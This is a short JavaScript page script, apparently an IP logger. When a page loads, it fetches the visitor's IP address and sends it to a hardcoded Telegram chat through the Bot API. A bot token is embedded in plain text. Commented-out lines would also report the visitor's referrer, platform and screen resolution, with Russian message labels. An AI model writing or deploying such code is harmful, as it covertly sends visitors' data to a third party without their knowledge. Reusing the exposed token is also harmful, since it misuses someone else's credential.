let info = new Userinfo();
const token = "1486167780:AAHXNWYm1McfP9eUxbYlIbUZXpdcJeC8qGg";
const tgid = "642425664"

function sendMessage(text) {
	let url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + tgid + '&text=' + text;
	let xhttp = new XMLHttpRequest();

	xhttp.open("GET", url, true);
	xhttp.send();
}


async function getInfo() {
    //sendMessage('Перешел от: ' + info.referrer());
    //sendMessage('Платформа: ' + info.browserInfo().platform);
    //sendMessage('Разрешение экрана: ' + String(info.sizeScreen().width) + 'x' + String(info.sizeScreen().height));
    ipobject = (await info.ip());
    sendMessage('IP адрес: ' + ipobject)
	
}

getInfo();
